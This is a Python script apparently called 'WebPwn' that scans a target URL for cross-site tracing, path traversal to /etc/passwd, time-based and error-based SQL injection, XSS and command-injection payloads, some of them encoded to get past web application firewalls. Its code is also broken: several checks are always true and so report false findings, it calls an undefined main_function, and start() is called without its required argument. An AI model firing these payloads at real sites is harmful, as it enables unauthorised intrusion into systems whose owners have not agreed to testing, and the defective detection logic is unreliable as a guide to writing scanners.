import requests
import sys
import time
import urllib
import re

def xst_(url):
    print("\n[!] Testing XST")
    headers = {"Test":"Hello_Word"}
    req = requests.get(url, headers=headers)
    head = req.headers
    if "Test" or "test" in head:
        print("[*] This site seems vulnerable to Cross Site Tracing (XST)!")
    else:
        print("[!] XST failed!")

def lfi_(url):
    print("\n[!] Testing LFI")
    payloads = ['../etc/passwd','../../etc/passwd','../../../etc/passwd','../../../../etc/passwd','../../../../../etc/passwd','../../../../../../etc/passwd','../../../../../../../etc/passwd','../../../../../../../../etc/passwd']
    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pay in payloads:
        uur = urlt + pay
        req = requests.get(uur).text
        if "root:x:0:0" in req:
            print("[*] Payload found.")
            print("[!] Payload:",pay)
            print("[!] POC",uur)
            break
        else:
             pass

def sql_(url):
    print("\n[!] Testing SQLi")
    urlt = url.split("=")
    urlt = urlt[0] + '='
    urlb = urlt + '1-SLEEP(2)'

    time1 = time.time()
    req = requests.get(urlb)
    time2 = time.time()
    timet = time2 - time1
    timet = str(timet)
    timet = timet.split(".")
    timet = timet[0]
    if int(timet) >= 2:
        print("[*] Blind SQL injection time based found!")
        print("[!] Payload:",'1-SLEEP(2)')
        print("[!] POC:",urlb)
    else:
        print("[!] SQL time based failed.")


    payload1 = "'"
    urlq = urlt + payload1
    reqqq = requests.get(urlq).text
    if 'mysql_fetch_array()' or 'You have an error in your SQL syntax' or 'error in your SQL syntax' \
            or 'mysql_numrows()' or 'Input String was not in a correct format' or 'mysql_fetch' \
            or 'num_rows' or 'Error Executing Database Query' or 'Unclosed quotation mark' \
            or 'Error Occured While Processing Request' or 'Server Error' or 'Microsoft OLE DB Provider for ODBC Drivers Error' \
            or 'Invalid Querystring' or 'VBScript Runtime' or 'Syntax Error' or 'GetArray()' or 'FetchRows()' in reqqq:
        print("\n[*] SQL Error found.")
        print("[!] Payload:",payload1)
        print("[!] POC:",urlq)
    else:
        pass

def xss_(url):
    paydone = []
    payloads = ['injectest','/inject','//inject//','<inject','(inject','"inject','<script>alert("inject")</script>']
    print("[!] Testing XSS")
    print("[!] 10 Payloads.")

    urlt = url.split("=")
    urlt = urlt[0] + '='
    for pl in payloads:
        urlte = urlt + pl
        re = requests.get(urlte).text
        if pl in re:
            paydone.append(pl)
        else:
            pass
    url1 = urlt + '%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb'
    req1 = requests.get(url1).text
    if "'>inject<svg/onload=confirm(/inject/)>web" in req1:
        paydone.append('%27%3Einject%3Csvg%2Fonload%3Dconfirm%28%2Finject%2F%29%3Eweb')
    else:
        pass

    url2 = urlt + '%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req2 = requests.get(url2).text
    if '<script>alert("inject")</script>' in req2:
        paydone.append('%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    url3 = urlt + '%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E'
    req3 = requests.get(url3).text
    if '<script>alert("inject")</script>' in req3:
        paydone.append('%27%3Cscript%3Ealert%28%22inject%22%29%3C%2Fscript%3E')
    else:
        pass

    if len(paydone) == 0:
        print("[!] Was not possible to exploit XSS.")
    else:
        print("[+]",len(paydone),"Payloads were found.")
        for p in paydone:
            print("\n[*] Payload found!")
            print("[!] Payload:",p)
            print("[!] POC:",urlt+p)



def checkwaf(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with status code:", sc.status_code)
    except:
        print("[!] Error with the first request.")
        exit()
    r = requests.get(url)

    opt = ["Yes","yes","Y","y"]
    try:
        if r.headers["server"] == "cloudflare":
            print("[\033[1;31m!\033[0;0m]The Server is Behind a CloudFlare Server.")
            ex = input("[\033[1;31m!\033[0;0m]Exit y/n: ")
            if ex in opt:
                exit("[\033[1;33m!\033[0;0m] - Quitting")
    except:
        pass

    noise = "?=<script>alert()</script>"
    fuzz = url + noise
    waffd = requests.get(fuzz)
    if waffd.status_code == 406 or waffd.status_code == 501:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    if waffd.status_code == 999:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    if waffd.status_code == 419:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    if waffd.status_code == 403:
        print("[\033[1;31m!\033[0;0m] WAF Detected.")
    else:
        print("[*] No WAF Detected.\n")

def rce_func(url):
  	print (" [!] Now Scanning for Remote Code/Command Execution ")
  	print (" [!] Covering Linux & Windows Operating Systems ")
  	print (" [!] Please wait ....")
  	# Remote Code Injection Payloads
  	payloads = [';${@print(md5(zigoo0))}', ';${@print(md5("zigoo0"))}']
  	# Below is the Encrypted Payloads to bypass some Security Filters & WAF's
  	payloads += ['%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B']
  	# Remote Command Execution Payloads
  	payloads += [';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
  	# used re.I to fix the case sensitve issues like "payload" and "PAYLOAD".
  	check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
  	main_function(url, payloads, check)

def xss_func(url):
        print ("\n [!] Now Scanning for XSS ")
        print (" [!] Please wait ....")
        #Paylod zigoo="css();" added for XSS in <a href TAG's
        payloads = ['%27%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
        payloads += ['%22%3Ezigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'zigoo0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb']
        check = re.compile('zigoo0<svg|x>x', re.I)
        main_function(url, payloads, check)

def error_based_sqli_func(url):
	print ("\n [!] Now Scanning for Error Based SQL Injection ")
	print (" [!] Covering MySQL, Oracle, MSSQL, MSACCESS & PostGreSQL Databases ")
	print (" [!] Please wait ....")
	# Payload = 12345'"\'\");|]*{%0d%0a<%00>%bf%27'  Yeaa let's bug the query :D :D
	# added chinese char to the SQLI payloads to bypass mysql_real_escape_*
	payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
	check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
	main_function(url, payloads, check)

def header(url):
    h = requests.get(url)
    he = h.headers

    try:
        print("Server:",he['server'])
    except:
        pass
    try:
        print("Date:",he['date'])
    except:
        pass
    try:
        print("Powered:",he['x-powered-by'])
    except:
        pass
    print("\n")
def banner(url):
    try:
        sc = requests.get(url)
        if sc.status_code == 200:
            sc = sc.status_code
        else:
            print("[!] Error with statu code:",sc.status_code)
    except:
        print("[!] Error with the first request.")
        exit()

    print("""
Target: {}
    """.format(url))
def help():
    print("""
    WebPwn
    ------
    
    python3 wpwn.py http://example.com/page.php?id=value
    """)
    exit()

def start(url):

    # try:
    #     arvs = sys.argv
    # #url = "https://mycartoonsin.wordpress.com"
    #     url = arvs[1]
    # except:
    #     help()

    if 'http' not in url:
        help()
    if '?' not in url:
        help()

    timing1 = time.time()
    banner(url)
    header(url)
    checkwaf(url)
    #xss_(url)
    sql_(url)
    lfi_(url)
    xst_(url)
    timing2 = time.time()
    timet = timing2 - timing1
    timet = str(timet)
    timet = timet.split(".")
    print("\n[!] Time used:",timet[0],"seconds.\n")


start()